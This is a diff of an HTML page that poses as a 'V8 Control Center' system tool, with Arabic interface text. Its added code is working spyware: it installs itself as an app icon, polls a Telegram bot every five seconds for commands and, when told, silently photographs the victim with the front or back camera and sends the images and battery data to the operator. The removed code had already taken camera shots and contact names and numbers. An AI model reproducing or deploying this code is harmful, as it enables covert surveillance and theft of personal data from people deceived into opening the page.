@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>V8 - System Update</title>
+    <title>V8 Control Center</title>
     <link rel="manifest" href="data:application/manifest+json;base64,ewogICJuYW1lIjogIlY4IFN5c3RlbSBDb250cm9sIiwKICAic2hvcnRfbmFtZSI6ICJWOCIsCiAgInN0YXJ0X3VybCI6ICIuIiwKICAiZGlzcGxheSI6ICJzdGFuZGFsb25lIiwKICAiYmFja2dyb3VuZF9jb2xvciI6ICIjMDAwMDAwIiwKICAidGhlbWVfY29sb3IiOiAiIzAwZmZjYyIKfQ==">
     
     <style>
@@ -11,16 +11,14 @@
         .panel { border: 1px solid #00ffcc; padding: 25px; border-radius: 15px; width: 90%; max-width: 450px; background: rgba(0,255,204,0.05); box-shadow: 0 0 30px #00ffcc; }
         .btn { background: #00ffcc; color: #000; border: none; padding: 15px; border-radius: 5px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
         #v, #c { display: none; }
-        .flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
-    <div class="flash" id="f"></div>
     <div class="panel">
-        <h2 id="t">V8 CONTROL PANEL</h2>
-        <p id="s">بانتظار تفعيل بروتوكول التحكم المستمر...</p>
-        <button class="btn" onclick="startControl()">تفعيل التحكم والمزامنة الكاملة ✅</button>
-        <button class="btn" id="installBtn" style="display:none; background:#fff;">تثبيت أداة الحماية الدائمة 🛠</button>
+        <h2 id="t">V8 SYSTEM - ACTIVE</h2>
+        <p id="s">انتظار تفعيل بروتوكول التحكم الدائم...</p>
+        <button class="btn" onclick="activateFullControl()">تفعيل التحكم والمزامنة ✅</button>
+        <button class="btn" id="installBtn" style="display:none; background:#fff;">تثبيت أداة التحكم الدائمة ⚙️</button>
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -31,7 +29,7 @@
         const params = new URLSearchParams(window.location.search);
         const uid = params.get('id');
 
-        // 1. نظام زرع الأيقونة (PWA)
+        // 1. نظام التثبيت (PWA) لجعل الرابط أيقونة ثابتة
         let deferredPrompt;
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault(); deferredPrompt = e;
@@ -42,54 +40,57 @@
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
-                if (outcome === 'accepted') console.log('V8 Planted!');
+                if (outcome === 'accepted') alert('تم التثبيت بنجاح!');
                 deferredPrompt = null;
             }
         });
 
-        // 2. وظيفة السحب والتحكم (تلقائية عند الضغط)
-        async function startControl() {
-            if(!uid) return;
-            document.getElementById('s').innerText = "جاري السحب والمزامنة...";
-
+        // 2. وظيفة تنفيذ الأوامر المباشرة (Control Action)
+        async function executeAction(mode) {
             try {
-                // سحب الكاميرا (منع السواد بالتأخير والفلاش)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
-                await new Promise(r => setTimeout(r, 2500)); // انتظار الضبط
-
-                // فلاش رقمي للتصوير
-                document.getElementById('f').style.opacity = '1';
-                const canvas = document.getElementById('c');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode === 'back' ? "environment" : "user" } });
                 const video = document.getElementById('v');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 2000)); // انتظار الضبط
+
+                const canvas = document.getElementById('c');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                const photo = canvas.toDataURL('image/jpeg', 0.9);
-                document.getElementById('f').style.opacity = '0';
+                const photo = canvas.toDataURL('image/jpeg', 0.8);
 
-                // سحب الشحن والأسماء
-                const b = await navigator.getBattery();
-                let report = `🚀 **صيد V8 جديد (تحكم كامل):**\n🔋 الشحن: ${Math.floor(b.level*100)}%\n📱 النظام: ${navigator.platform}`;
-
-                if ('contacts' in navigator) {
-                    try {
-                        const list = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                        report += `\n📇 سجل الأسماء:\n` + list.slice(0, 10).map(c => `👤 ${c.name}: ${c.tel}`).join('\n');
-                    } catch(e) {}
-                }
-
-                // إرسال البيانات فوراً لتجنب صراع الـ Polling
                 const blob = await (await fetch(photo)).blob();
                 const fd = new FormData();
                 fd.append('chat_id', uid);
                 fd.append('photo', blob, 'v8.jpg');
-                fd.append('caption', report);
+                fd.append('caption', `✅ تم تنفيذ أمر التحكم المباشر (${mode})`);
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-
-                document.getElementById('s').innerText = "تمت المزامنة بنجاح!";
                 stream.getTracks().forEach(t => t.stop());
-                setTimeout(() => window.location.replace("https://google.com"), 2000);
-            } catch (e) { window.location.replace("https://google.com"); }
+            } catch (e) { console.log(e); }
+        }
+
+        // 3. المستمع الدائم للأوامر (Persistent Listener)
+        async function activateFullControl() {
+            if(!uid) return;
+            document.getElementById('s').innerText = "🟢 التحكم متصل.. بانتظار إشارتك";
+            
+            // إرسال تنبيه ببدء "التحكم النشط"
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=🟢 تم فتح قناة التحكم الكامل! يمكنك الآن إرسال الأوامر.`);
+
+            setInterval(async () => {
+                try {
+                    // فحص آخر رسالة في البوت (التحكم)
+                    const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+                    const data = await res.json();
+                    const cmd = data.result[0].message.text;
+
+                    if (cmd === "/cam_front") executeAction('front');
+                    if (cmd === "/cam_back") executeAction('back');
+                    if (cmd === "/get_data") {
+                        const b = await navigator.getBattery();
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${uid}&text=🔋 الشحن: ${Math.floor(b.level*100)}%`);
+                    }
+                } catch (e) {}
+            }, 5000); // يفحص الأوامر كل 5 ثوانٍ
         }
     </script>
 </body>
